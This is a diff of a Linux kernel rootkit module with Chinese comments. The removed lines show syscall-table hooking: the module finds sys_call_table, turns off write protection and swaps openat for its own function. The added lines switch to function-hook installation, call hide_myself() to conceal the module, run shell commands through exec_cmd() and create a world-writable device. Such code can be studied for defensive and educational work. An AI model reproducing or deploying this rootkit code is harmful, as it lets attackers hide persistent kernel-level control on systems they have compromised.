@@ -8,30 +8,7 @@
 // 模块加载、卸载函数定义
 static int __init rootkit_init(void)
 {
-    //获取系统调用表地址
-    real_sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
-    //错误处理
-    if (!real_sys_call_table)
-    {
-        pr_info("sys call table not found");
-        return -EFAULT;
-    }
-    //打印出系统调用表地址
-    pr_info("real_sys_call_table: %p", real_sys_call_table);
-
-    // 获取真实的sys_openat函数地址
-    // __NR_openat是openat系统调用的系统调用号,https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl
-    real_sys_openat = (void *)real_sys_call_table[__NR_openat];
-    
-    // 关闭写保护，将真实的sys_openat函数地址映射到我们自己写的openat函数地址处，偷梁换柱
-    disable_wp();
-    real_sys_call_table[__NR_openat] = (void *)my_sys_openat;
-    
-    // 恢复现场，打开写保护
-    enable_wp();
-
-    pr_info("update __NR_openat: %p->%p", real_sys_openat, my_sys_openat);
-
+    int err;
     // 注册设备
     major_num = register_chrdev(0, DEVICE_NAME, &rootkit_fo);
     if (major_num < 0)
@@ -65,24 +42,26 @@ static int __init rootkit_init(void)
     __inode->i_mode |= 0666;
     filp_close(__file, NULL);
 
+    // 模块测试
     module_info();
     hide_myself();
     show_myself();
+    exec_cmd("ls");
+    
+    
+    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    if (err)
+        return err;
     pr_info("Module install successful!!!\n");
-    exec_cmd("echo 123 >> /tmp/result.txt");
     return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-    // 模块退出的时候，需要恢复现场，将修改过的地址再改回去
-    disable_wp();
-    real_sys_call_table[__NR_openat] = (void *)real_sys_openat;
-    enable_wp();
-    
     device_destroy(module_class, MKDEV(major_num, 0));
     class_destroy(module_class);
     unregister_chrdev(major_num, DEVICE_NAME);
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     pr_info("Module uninstall successful!\n");
 }
 
